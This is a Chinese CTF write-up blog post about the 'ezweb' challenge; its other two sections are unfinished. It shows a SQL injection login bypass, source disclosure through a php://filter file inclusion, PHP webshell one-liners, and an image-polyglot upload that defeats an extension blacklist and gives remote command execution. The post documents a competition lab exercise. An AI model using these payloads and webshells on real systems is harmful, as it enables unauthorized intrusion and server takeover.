---
title: NeSE丙升乙CTF升级赛Writeup
toc: true
date: 2022-10-03 10:33:32
index_img: /image/thumbnails/NeSE-logo-new.png
categories:
	- [CTF]
tags: [NeSE, Writeup]
---

10月2日NeSE丙组升乙组CTF升级赛Writeup

<!--more-->

还是Too naive了，只做出来一题+两个半题

# Web

## ezweb

### 1 登录

首先是一个系统登录界面，直接尝试诸如admin，test提示用户名密码错误之后，采用绕过密码判断`admin' or 1=1#`成功登录。（虽然后来不知道谁把admin密码置空了，可以直接登录admin，但影响不大，不管用什么账户登录都可以进行后续的文件上传）

<div align=center>  <img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061142953.png" style="zoom:67%;"/></div>

### 2 分析

在首页`综合管理`乱点一通无果之后，切换到`用户列表`，看到有所有用户个人信息：

<!-- 让表格居中显示的风格 -->

<style>
.center 
{
  width: auto;
  display: table;
  margin-left: auto;
  margin-right: auto;
}
</style>


<div class="center">

|  ID  | User |            EmailAddress             | LastLogin           |
| :--: | :--: | :---------------------------------: | ------------------- |
|  1   | ads  | [qqq@mail.com](mailto:qqq@mail.com) | 2019-08-07 13:00:00 |

</div>

似乎并没有什么用，拉到最底下发现有提示

<img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061143978.png" style="zoom:50%;" />

是提示**Please input "?f=aab.php"**，应该是可以包含任意文件。继续切到`修改个人信息`，发现可以修改管理员个人信息，此处可利用头像上传文件。然后结合之前的提示`?f=*php`和php伪协议读取源码

```bash
# 首先通过php://filter读取目标源码的base64
http://124.16.75.162:31010/table.php?f=php://filter/read=convert.base64-encode/resource=/var/www/html/info.php

# 然后再base64解码得到源码
```

- info.php（关键部分源码）

```php
<?php
if (isset($_POST['address'])) {
    ...
    if (isset($_FILES)) {
        if ($_FILES["file"]["error"] > 0) {
            echo "错误：" . $_FILES["file"]["error"] . "<br>";
        } else {
			function deldot($s){
				for($i = strlen($s)-1;$i>0;$i--){
					$c = substr($s,$i,1);
					if($i == strlen($s)-1 and $c != '.'){
						return $s;
					}
	 
					if($c != '.'){
						return substr($s,0,$i+1);
					}
				}
			}
			$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini",".htaccess");
            $file_name = trim($_FILES['file']['name']);
			$file_name = deldot($file_name);
			//echo $file_name;
			$file_ext = strrchr($file_name, '.');
			$file_ext = strtolower($file_ext); 
			$file_ext = str_ireplace('::$DATA', '', $file_ext);
			$file_ext = trim($file_ext);
			
			if (!in_array($file_ext, $deny_ext)) {
				$name =$_FILES["file"]["name"] ;
				//$temp_file = $_FILES['file']['tmp_name'];
				//$img_path = UPLOAD_PATH.'/'.$file_name;
				$content = file_get_contents($_FILES['file']['tmp_name']);
				$content = str_replace('?', '!', $content);
				
				if (file_exists("upload/" . $_FILES["file"]["name"]))
                {
                    echo "<script>alert('文件已经存在');</script>";
                }
				else{
					move_uploaded_file($_FILES["file"]["tmp_name"], "assets/images/avatars/" . $_FILES["file"]["name"]);
					file_put_contents("assets/images/avatars/" . $_FILES["file"]["name"], $content);
					$helper = new sqlhelper();
					$sql = "UPDATE  admin SET icon='$name' WHERE id=$_SESSION[id]";
					$helper->execute_dml($sql);
				}
			} else {
				echo "<script>alert('不允许上传的类型');</script>";
			}
        }
    }
}
?>
```

看到对上传文件的最后一个`.`后面的扩展名做**黑名单限制**，以及进行了**小写转换**、**空格去除**、**特殊敏感字符替换**等操作。然后将服务端接收到的文件内容写入`assets/images/avatars/上传的文件名`。

### 3 上传

- 首先设计一句话木马：

```php
// 常见的一句话木马因为有?而失效
<?php eval(@$_POST['cmd']);?>
    
// 于是采用下面的马,一举两得
<script language="php">phpinfo();eval($_REQUEST['cmd']);</script>
```

- 然后上传木马，我尝试了各种姿势

  - burp改文件扩展名，burp改mime type都不行
  - %00截断也不行，说明php版本并不低
  - `zzy.php. .`空格绕过也不好使，虽然能上传成功，但好像访问不了==
  - ...
  - 最后还是选择用图片马，使用copy命令合并为`zzy.php.jpg`，然后直接上传成功

<div align=center><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217984.png" style="zoom:60%;" /></div>

- 使用蚁剑连接成功

  - URL地址: http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg
  - 连接密码: `cmd`
  - (为了确保登录会话的有效，我也在请求信息里传入了Cookie)

- 在根目录下找到`flag{flaaaaaaaaaaaaaaaaaaa.ezweb}`

<div align=center><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217687.png" style="zoom:60%;" /></div>

## sqli

TO BE COMPLETED



# Re

## Debuggame

TO BE COMPLETED